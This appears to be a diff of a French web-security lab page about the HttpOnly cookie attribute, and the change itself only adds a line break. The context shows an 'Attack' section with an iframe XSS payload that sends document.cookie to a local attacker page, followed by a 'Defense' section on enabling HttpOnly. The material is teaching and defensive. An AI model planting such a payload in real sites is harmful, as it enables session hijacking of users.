@@ -32,7 +32,7 @@ HttpOnly est un attribut des cookies qui permet d’indiquer aux navigateurs de 
 **Attaque :**<br/>
 L’attaquant a déposé un lien permettant d’envoyer une requête contenant les cookies sur un site malveillant. HttpOnly est désactivé.<br/>
 `<iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>`<br/>
-http://localhost:8080/session/vulnerable_session_httponly.php
+http://localhost:8080/session/vulnerable_session_httponly.php <br/>
 **Defense :**<br/>
 Pour protéger ce site de ce genre d’attaque, il faut préciser aux navigateurs d’utiliser HttpOnly. De cette manière, un attaquant ne pourra pas récupérer des données contenues dans les cookies.<br/>
 ![image](https://user-images.githubusercontent.com/54988405/137313105-bded2987-aeda-411d-84d9-6041ad80afa8.png)
